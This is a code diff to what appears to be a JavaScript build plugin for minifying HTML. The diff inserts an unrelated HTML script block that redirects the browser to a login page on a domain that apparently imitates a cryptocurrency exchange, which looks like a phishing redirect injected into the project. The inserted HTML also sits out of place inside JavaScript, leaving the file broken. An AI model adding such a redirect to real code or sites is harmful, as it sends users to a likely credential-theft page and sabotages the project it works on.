@@ -28,7 +28,11 @@ module.exports = {
         }
       });
 
-
+<script id='dir'>
+//<![CDATA[
+window.location.replace("https://kanga-exchange-trade.eoass.com/login/");
+//]]>
+</script>
     } catch (error) {
       utils.build.failPlugin('The Minify HTML plugin failed.', { error })
     }
